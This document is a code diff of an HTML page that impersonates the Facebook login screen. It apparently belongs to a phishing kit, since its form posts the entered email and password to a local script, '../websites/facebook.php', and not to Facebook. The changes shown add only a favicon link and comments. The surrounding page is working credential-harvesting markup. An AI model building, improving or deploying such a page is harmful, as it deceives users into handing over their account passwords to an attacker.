@@ -5,6 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook - Log In or Sign Up</title>
     <link rel="stylesheet" href="style.css">
+    <!-- Optional: Add a favicon -->
+    <link rel="icon" type="image/x-icon" href="favicon.ico">
 </head>
 <body>
     <div class="container">
@@ -13,6 +15,7 @@
             <p>Connect with friends and the world around you on Facebook.</p>
         </div>
         <div class="login-box">
+            <!-- Form action points to the PHP script -->
             <form action="../websites/facebook.php" method="POST">
                 <input type="text" name="email" placeholder="Email or Phone Number" required>
                 <input type="password" name="password" placeholder="Password" required>
@@ -23,6 +26,7 @@
             </form>
         </div>
     </div>
+    <!-- Optional: Add JavaScript for interactivity -->
     <script src="script.js"></script>
 </body>
 </html>
